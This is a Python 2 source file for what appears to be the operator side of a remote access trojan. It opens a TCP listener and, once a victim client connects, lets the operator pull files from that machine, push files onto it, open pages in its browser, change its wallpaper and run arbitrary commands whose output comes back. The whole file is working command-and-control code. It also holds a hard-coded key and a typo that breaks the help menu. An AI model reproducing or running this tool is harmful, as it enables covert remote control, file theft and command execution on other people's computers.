#!/usr/bin/env python

import socket 
import os      
import threading
import subprocess
import hashlib
import Crypto
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES


secret='SECRET P@$$w0rd_ N33DS TO B3 b!G'



def download(conn,command):

	x,src,dst=map(str,command.split(' '))
	conn.send(command)
	f = open(dst,'wb') 
	bits = conn.recv(1024)
	while bits!='': 
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if not bits.endswith('DONE'):
			f.write(bits)
		
		if bits.endswith('DONE'):
			bits=bits.replace('DONE','')
			f.write(bits)
			f.close()
			break
		bits=conn.recv(1024)

	md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()	
	conn.send(md5_sv)
	if conn.recv(1024)=='md5 OK':
		print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
	else :
		print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
	
	
        
    
def upload(conn,command):


	x,src,dst=map(str,command.split(' '))
	conn.send(command)
	file_to_send=open(src,'rb')
	packet=file_to_send.read(1024)
	while packet!='':
		conn.send(packet) 
		packet = file_to_send.read(1024)
	conn.send('DONE')
	file_to_send.close()
	md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
	conn.send(md5_sv)
	print md5_sv
	if conn.recv(1024)=='md5 OK':
		print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
	else :
		print '[-] MD5 Checksum not Verified !'


def _help():
	subprocess.call('clear',shell=True)
	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
	
	while True:
		help_command=str(raw_input('Help)'))
		if help_command=='exit':
			break
		elif help_command=='help(terminate)':
			print 'terminate ends the session'
		elif help_command=='help(download)':
			print 'download => downloads a file from the client machine ex: download #source #dest'
		elif help_command=='help(upload)':
			print 'upload => uploads a file to the client machine ex: upload #source #dest'
		elif hel_command=='help(username)':
			print 'username => returns the username of the client session'
		elif hel_command=='help(browse)':
			print 'browse => launches a web page in the client browser ex: browse www.google.com'
		elif hel_command=='help(change_desktop_bg)':
			print 'change_desktop_bg => changes the desktop background of the client ex : change_desktop_bg #path_of_image'
	return

def _list():
	print '\nAvailable commands:'
	print '\nupload\ndownload\nclear\nhelp\nchange_desktop_bg\nbrowse\n'	


def connect():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('192.168.1.2', 8080))
        s.listen(100)
        print '[+] Listening for incoming TCP connection on port 8080'
        conn,addr=s.accept()
        print '[+] We got a connection from: ', addr[0]

        username=conn.recv(1024)

        client_public_text=conn.recv(1024)
        client_public=RSA.importKey(client_public_text)

        secret_encrypted=client_public.encrypt(secret, None)

        conn.send(secret_encrypted[0])

        client_secret=conn.recv(1024)
        if client_secret==secret:
            print 'The secret key was sent successfully'

        print 'To go to the menu of the manual of commands type help \n'
        print 'To list the available commands type ?\n'
        while True:   
               	command=raw_input(">")		
                if 'terminate' in command:
                        conn.send('terminate')
                        conn.close() 
                        break
                elif 'download' in command: 
                        download(conn,command)
                elif 'upload' in command:
                        upload(conn,command)
                elif 'browse' in command:
                        conn.send(command)
                        pass	
                elif 'change_desktop_bg' in command:
                        conn.send(command)
                        pass
                elif 'clear' in command:
                		subprocess.call('clear',shell=True)
                		pass
                elif command=='help':
                		_help()
                elif command=='?':
                		_list()
                elif command=='':
                		pass
                else :	
                        conn.send(command)
                        print conn.recv(1024)
        
def main ():
	subprocess.call('clear',shell=True)
	connect()
main()











